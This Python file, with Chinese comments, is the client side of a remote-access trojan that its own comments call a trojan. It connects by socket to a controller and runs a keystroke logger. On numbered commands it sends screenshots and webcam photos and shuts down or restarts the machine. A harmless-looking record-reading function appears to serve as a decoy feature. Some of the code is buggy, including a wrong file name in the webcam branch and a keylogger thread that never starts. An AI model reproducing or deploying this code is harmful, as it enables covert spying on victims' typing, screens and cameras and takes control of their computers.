import os , cv2, sys, threading, keyword,keyboard
from socket import *              #pip install opencv-python 安装模块可以打开摄像头

from PIL import ImageGrab

s = socket()

s.connect(('127.0.0.1', 8080))

def press(event):
    if len(event.name) == 1:
        s.send(event.name.encode('utf-8'))
    else:
        s.send(f'[{event.name}]'.encode('utf-8'))


def key_logger():
    keyboard.on_press(press)      #记录按键操作
    keyboard.wait()


logger = threading.Thread(target=key_logger)

# def test_grab(s):
#
# loon = threading.Thread(target=test_grab)


# 打开摄像头拍照 发给后台
def send_da(s):
        command = s.recv(1024).decode()
        print(command)
        if command == '6':
            sys.exit(0)
        elif command == '2':
            os.system('shutdown -s -t 3')
        elif command == '3':
            os.system('shutdown -r -t 3')
        elif command == '4':
            pass
            # logger.start()
        elif command == '5':
            while True:
                img = ImageGrab.grab()  # 截图
                img = img.resize((800, 600))  # 改分辨率
                img.save('test.png')
                # 把木马截图发给后台
                filesize = os.path.getsize('test.png')  # 计算图片大小
                # print(filesize)
                s.send(str(filesize).encode())  # 发送图片的大小
                # s.recv(1024)  # 等待后台确认

                with open('test.png', 'rb') as f:
                    for data in f:  # 读数据
                        s.sendall(data)
        elif command == '1':
            pass
            #参数0表示使用默认摄像头
            cap = cv2.VideoCapture(0)      #打开摄像头，拍照片，发送照片
            try:
                ret,frame = cap.read()
                if ret:
                    cv2.imwrite('test.png', frame)  #read从摄像头里面读取一帧图像
            finally:
                cap.release()      #把一帧图像frame写入文件test.jpg
                 #关闭摄像头

            #将图片的大小发给后台
            fi = os.path.getsize('test.png')

            s.send(str(fi).encode('utf-8')) #str()将大小数字转换成字符串，在编码
            s.recv(1024)
            # 图片的数据发给后台
            with open('1.png', 'rb') as f:#打开文件
                for data in f:
                    s.send(data) #边读边发

# 给对方一个功能
def fun():
    # while True:
        class momery:

            def __init__(self, name, age, place):
                self.name = name
                self.age = age
                self.place = place

            def __str__(self):
                return f"你的名字：{self.name} 年龄为{self.age}来自 {self.place}"


        class Read_data:  # 定义一个抽象类

            def read_data(self):
                pass


        class My_read(Read_data):  # 在子类中实现父类的方法，读取data.txt中的数据

            def __init__(self, path):
                self.path = path

            def read_data(self) -> momery:
                f = open(self.path, "r", encoding="utf-8")
                record_list: list[momery] = []

                for line in f.readlines():
                    line = line.strip()
                    data_line = line.split("，")
                    record = momery(data_line[0], data_line[1], data_line[2])
                    record_list.append(record)

                f.close()
                return record_list


        if __name__ == "__main__":
            filed = My_read('data.txt')
            file_data: list = filed.read_data()
            for l in file_data:
                print(l)
# Thread(group [, target [, args [, kwargs [,]]]])   args =已元组的方式传入（s,)(有这个逗号才是元组) ，kwargs = 以 字典的形式传入
# 创建了两个线程同时进行工作
threading.Thread(target=send_da, args=(s,),daemon=True).start()
# threading.Thread(target=test_grab, args=(s,),daemon=True).start()
threading.Thread(target=fun, args=()).start()

